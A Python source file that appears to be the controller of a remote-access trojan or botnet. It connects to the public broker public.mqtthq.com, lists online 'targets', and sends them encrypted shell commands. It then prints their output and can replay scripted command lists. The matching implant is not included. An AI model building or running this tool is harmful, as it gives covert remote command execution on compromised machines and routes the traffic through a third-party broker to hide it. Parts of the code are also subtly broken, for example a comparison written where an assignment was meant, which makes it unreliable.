import paho.mqtt.client as mqtt_client
import os
import sys
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time

systype = ("windows" if os.name == "nt" else "unix")

file_save_path = fr"{sys.path[0]}\rx" # .py

if getattr(sys, "frozen", False): # .exe
    if systype == "windows":
        file_save_path = r".\rx "[:-1]
    else:
        file_save_path = "./rx"
elif __file__: # .py
    if systype == "windows":
        file_save_path = fr"{sys.path[0]}\rx"
    else:
        file_save_path = f"{sys.path[0]}/rx"

if file_save_path[-1] in ["/", "\ "[-1]]:
    file_save_path == file_save_path[:-1]
if not os.path.isdir(file_save_path):
    os.makedirs(file_save_path)

topic_list = {
    "stats":"/MQTT/stats", 
    "MQTT":"/MQTT", 
    "result":"/MQTT/result"
}
connected = False
online_list = {}
job_list = []
todo_list = []
target = ""

port = 28978
func_dict = {}
run_list = []

key = b"replacewithlen16"
iv = b"replacewithlen16"

def getpath():
    if getattr(sys, "frozen", False):
        application_path = sys.executable
    elif __file__:
        application_path = os.path.abspath(__file__)
    return application_path

app_path = "\\".join(getpath().split("\\")[:-1])

def encrypt(plaintext:bytes, key=key, iv=iv):
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return ciphertext

def decrypt(ciphertext:bytes, key=key, iv=iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext
    except:
        return False

def gen_id():
    return hashlib.md5(str(time.time()).encode()).hexdigest()

def on_connect(client, userdata, flags, rc):
    global connected
    connected = True

    client.subscribe(topic_list["stats"])
    client.subscribe(topic_list["result"])

def on_disconnect(client, userdata, rc):
    global connected
    connected = False

def on_message(client, userdata, msg):
    global online_list
    
    msg.payload = decrypt(msg.payload)
    if msg.payload:
        if msg.topic == topic_list["stats"]:
            online_list[msg.payload.decode()] = 32
        elif msg.topic == topic_list["result"]:
            job_id = msg.payload.split(b" ")[0].decode()
            content = b" ".join(msg.payload.split(b" ")[1:]).decode()
            if job_id in job_list:
                if content.split("<stderr>")[0] == "":
                    print("\033[1;31m", end="")
                    content = "".join(content.split("<stderr>")[1:])
                print(content)
                job_list.remove(job_id)
        else:
            print(msg.topic+" "+str(msg.payload))

def send(client:mqtt_client.Client, topic, id, content:bytes, qos=0):
    client.publish(topic, encrypt(id.encode() + b" " + content), qos=qos)

client = mqtt_client.Client()
client.on_connect = on_connect
client.on_message = on_message

client.connect("public.mqtthq.com", 1883, 60)
client.loop_start()

print("Connecting to MQTT broker...")

if not connected:
    if input("\033[0mWait until connect to MQTT broker (yes/no)>").lower() == "yes":
        while not connected:
            time.sleep(0.5)
print()

while True:
    if target:
        if todo_list:
            cmd = todo_list[0]
            todo_list = todo_list[1:]
            print(f"\033[1;32m[script] {cmd}")
        else:
            cmd = input(f"\033[1;32m{target}>")

        if cmd.lower() == "disconnect":
            target = ""
        elif cmd.lower() in ["cls", "clear"]:
            os.system("cls" if os.name == "nt" else "clear")
        elif cmd.startswith("#"):
            script_name = cmd[1:]
            
            try:
                script = open(fr"{app_path}\script\{script_name}.txt", "r").read().split("\n")

                for line in script:
                    todo_list.append(line)
            except FileNotFoundError:
                print("\033[1;31mScript not found. ")
            print()
        else:
            job_id = gen_id()
            while job_id in job_list:
                job_id = gen_id()
            send(client, topic_list["MQTT"], f"{session_id} {target}", b"cmd "+job_id.encode()+b" "+cmd.encode(), qos=2)
            job_list.append(job_id)

            if cmd.lower() in ["exit", "quit"]:
                target = ""
                job_list.remove(job_id)
            else:
                while job_id in job_list and online_list.get(target, 0)>0 and connected:
                    time.sleep(0.1)
                    online_list[target] -= 1
                if not online_list.get(target, 0)>0:
                    print("\033[1;31mTarget disconnected with broker. ")
                    target = ""
                elif not connected:
                    print("\033[1;31mDisconnected with broker, retrying...")
                    target = ""
    else:
        cmd = input("\033[0m>")

        if cmd == "":
            pass
        elif cmd.lower().split()[0] == "conn":
            if connected:
                online_list = {}

                time.sleep(1.5)
                if " ".join(cmd.split(" ")[1:]) in list(online_list):
                    target = " ".join(cmd.split(" ")[1:])
                    session_id = gen_id()
                else:
                    print("\033[1;31mTarget is not online. ")
            else:
                print("\033[1;31mMQTT broker not connected yet. ")
                if input("\033[0mWait until connect to MQTT broker (yes/no)>").lower() == "yes":
                    while not connected:
                        time.sleep(0.5)
            print()
        elif cmd.lower() == "list":
            if connected:
                online_list = {}

                time.sleep(2)
                if online_list:
                    for i in list(online_list):
                        print(i)
                else:
                    print("\033[1;31mNo target is online. ")
            else:
                print("\033[1;31mMQTT broker not connected yet. ")
                if input("\033[0mWait until connect to MQTT broker (yes/no)>").lower() == "yes":
                    while not connected:
                        time.sleep(0.5)
            print()
        elif cmd.lower() in ["cls", "clear"]:
            os.system("cls" if os.name == "nt" else "clear")
        elif cmd.lower() in ["exit", "quit"]:
            os.system(f"taskkill -F -PID {os.getpid()}" if os.name == "nt" else f"kill -9 {os.getpid()}")
